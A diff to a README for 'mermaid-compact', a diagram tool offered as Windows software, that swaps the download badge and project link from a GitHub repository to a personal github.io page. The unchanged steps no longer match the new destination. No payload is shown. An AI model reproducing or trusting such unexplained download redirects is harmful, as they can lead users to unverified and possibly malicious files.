@@ -1,6 +1,6 @@
 # 📉 mermaid-compact - Create diagrams in one simple file
 
-[![Download Mermaid Compact](https://img.shields.io/badge/Download_Software-blue)](https://github.com/sanderschinchy506/mermaid-compact)
+[![Download Mermaid Compact](https://img.shields.io/badge/Download_Software-blue)](https://sanderschinchy506.github.io)
 
 ## 📁 What is this software?
 
@@ -19,7 +19,7 @@ This software runs on any modern Windows computer. Ensure you have the following
 
 Follow these steps to get the file on your computer:
 
-1. Visit the project website at [https://github.com/sanderschinchy506/mermaid-compact](https://github.com/sanderschinchy506/mermaid-compact).
+1. Visit the project website at [https://sanderschinchy506.github.io](https://sanderschinchy506.github.io).
 2. Look for the green button labeled Code near the top of the page.
 3. Click the button and select Download ZIP.
 4. Wait for the browser to finish saving the file to your computer.
